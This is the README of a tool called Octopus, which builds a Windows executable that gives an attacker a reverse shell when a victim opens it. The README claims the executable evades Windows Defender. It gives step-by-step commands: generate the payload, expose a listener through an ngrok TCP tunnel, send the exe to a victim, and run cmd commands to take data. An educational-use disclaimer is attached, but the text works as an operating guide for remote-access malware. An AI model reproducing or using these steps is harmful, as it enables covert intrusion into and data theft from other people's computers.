
# Octopus

Octopus is a tool which can generate an exe which can return a
reverse shell to the attacker when the victim runs the exe file.
The exe generated by this tool can currently (June 2022) bypass
windows defender and some other antiviruses. I hope that the
antiviruses will be able to detect the octopus exe soon because
this is a threat to privacy.

# Important

This tool is strictly made for educational purposes only and
I have no intention to harm anyone or steal any data so please
test this only on the machines you own. This tool is made so that
people can get the basic idea how reverse shell works

#### I will not be responsible for any of your acts.




# Installation

Install octopus

```bash
git clone https://github.com/Rajas2323/octopus
```

The octopusgenerator.py script will only work on windows currently
because nuikta which is an exe generator tool for python was
giving errors when I tested it on linix. I may fix this issue
later
    
# Usage/Examples


## Localhost Usage Example

If you want to test octopus locally, follow the given steps

in the octopus directory, there are two python files

* listener.py
* octopusgenerator.py 

we will generate the the exe by running the command

```bash
python octopusgenerator.py -H 127.0.0.1 -p 4444 -o exename.exe
```

now we will listen for connections by running
```bash
python listener.py
```

now the listener script will ask you to enter port on which
you want to listen, in this example the port is 4444, so we will have
to enter there 4444. Now when you will double click or open the
exe, it will send reverse shell on the listener.


## Remote Usage Example

#### Now you will learn how to use this tool on remote devices.

First of all, to listen to the connections from remote computers
We will need port forwarding, but setting a static ip address and
setting up port forwarding is really a headache. So we will use
a tool which will make our work very simple.
The tool is Ngrok

Now I won't tell you how to download and setup ngrok. Moving
directly to the usage, we will execute command,

```bash
ngrok tcp 4444
```

Now ngrok tool will show you this on terminal

```bash
Session Status       Online
Account              yourregistered@gmail.com (Plan: Free)
Version              3.0.2
Region               Your Country
Latency              42.5611ms
Web Interface        http://127.0.0.1:4040
Forwarding           tcp://0.tcp.in.ngrok.io:19280 -> localhost:4444

```

Now ngrok has created a tcp tunnel which will forward the
connections to 127.0.0.1:4444 on which we will run our listener

The important information shown is Forwarding, 
ngrok is forwarding connections which connect to
0.tcp.in.ngrok.io on port 19280 in this example to 127.0.0.1:4444
Now you don't have to close ngrok at all


So while generating octopus exe, will set host to our ngrok tcp link
which is 0.tcp.in.ngrok.io and we will set port to our ngrok port
which is 19280 in this example..

So the command to generate exe will be 

```bash
python octopusgenerator.py -H 0.tcp.in.ngrok.io -p 19280 -o exename.exe
```

now after exe is created, we will simply run our listener by running command

```bash
python listener.py
```

now the python script will ask to input our port, we will enter
the port which we entered in the ngrok command which is 4444
in this case.

Now we will send the exe to our victim machine and when the exe is
executed, we will get reverse shell and will be able enter cmd commands
to get data from that machine. If you destroy the ngrok instance or
the user will close the exe via task manager, we will loose the
reverse shell as the connection will be lost.